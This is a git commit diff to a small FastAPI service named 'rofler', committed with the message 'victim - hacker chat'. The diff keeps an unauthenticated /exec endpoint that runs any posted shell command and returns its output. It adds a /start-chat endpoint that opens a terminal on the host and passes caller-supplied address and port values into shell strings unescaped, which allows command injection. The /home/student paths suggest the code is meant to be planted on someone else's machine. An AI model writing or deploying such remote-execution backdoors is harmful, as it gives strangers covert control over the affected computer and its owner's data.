17ce2e2b403441ead88badf367ea223d113cfa88
ImCocos <codimcocos@gmail.com>
2024-03-16 23:25:07 +0300

    victim - hacker chat

--- main.py
+++ main.py
@@ -22,16 +22,26 @@ systemctl reboot;
 
 
 @app.get("/update")
-async def root() -> dict[str, str]:
+async def root() -> dict:
     os.system(update_cmd)
     return {'status': 'ok'}
 
 @app.post('/exec')
-def exec(cmd: str):
-    os.system(cmd + ' > ~/rofler/.tmp')
+def exec(cmd: str) -> dict:
+    os.system(cmd + ' > ~/rofler/.tmp & disown')
     with open(os.path.join(os.path.expanduser('~'), 'rofler/.tmp'), 'r') as file:
         raw = file.read()
     return {'status': 'ok', 'text': raw}
+
+@app.post('/start-chat')
+def start_chat(address: str, port, test_mode: bool = False) -> dict:
+    if test_mode:
+        start_chat_cmd = f'~/Git_projects/rofler/venv/bin/python ~/Git_projects/rofler/client.py {address} {port}'
+        os.system(f'kitty --hold sh -c "{start_chat_cmd}" & disown')
+    else:
+        start_chat_cmd = f'/home/student/rofler/venv/bin/python /home/student/rofler/client.py {address} {port}'
+        os.system(f'konsole -e /bin/bash --rcfile <(echo "{start_chat_cmd}") & disown')
+    return {'status': 'ok'}
 
 
 if __name__ == "__main__":
